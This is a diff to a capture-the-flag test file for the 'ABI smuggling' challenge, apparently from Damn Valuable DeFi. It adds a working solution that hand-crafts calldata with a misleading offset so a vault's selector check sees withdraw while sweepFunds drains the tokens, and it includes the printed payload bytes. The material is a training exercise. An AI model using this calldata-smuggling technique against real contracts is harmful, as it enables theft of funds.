@@ -4,12 +4,12 @@ const { expect } = require('chai');
 describe('[Challenge] ABI smuggling', function () {
     let deployer, player, recovery;
     let token, vault;
-    
+
     const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [ deployer, player, recovery ] = await ethers.getSigners();
+        [deployer, player, recovery] = await ethers.getSigners();
 
         // Deploy Damn Valuable Token contract
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
@@ -45,6 +45,41 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const abi = [
+            "function sweepFunds(address receiver, address token)",
+            "function withdraw(address token, address to, uint256 amount)",
+            "function execute(address to, bytes calldata data)"
+        ];
+        const iface = new ethers.utils.Interface(abi);
+        console.log(iface.getSighash("sweepFunds(address,address)")); // 0x85fb709d
+        console.log(iface.getSighash("withdraw(address,address,uint256)")); // 0xd9caed12
+
+        let data = ethers.utils.hexConcat([
+            iface.getSighash("execute(address,bytes)"),
+            ethers.utils.hexZeroPad(vault.address, 32), // 0x00
+            ethers.utils.hexZeroPad(0x80, 32), // 0x20
+            ethers.utils.hexZeroPad(0x0, 32), // 0x40
+            iface.getSighash("withdraw(address,address,uint256)"), // 0x60
+            ethers.utils.hexZeroPad(0x0, 32 - 4),
+            ethers.utils.hexZeroPad(0x44, 32), // 0x80
+            iface.encodeFunctionData("sweepFunds(address,address)", [recovery.address, token.address]), // 0xA0
+        ]);
+
+        console.log(data);
+
+        /*
+        0x1cff79cd
+        000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
+        0000000000000000000000000000000000000000000000000000000000000080
+        0000000000000000000000000000000000000000000000000000000000000000
+        d9caed1200000000000000000000000000000000000000000000000000000000
+        0000000000000000000000000000000000000000000000000000000000000044
+        85fb709d
+        0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc
+        0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
+         */
+
+        await player.sendTransaction({ to: vault.address, data: data });
     });
 
     after(async function () {
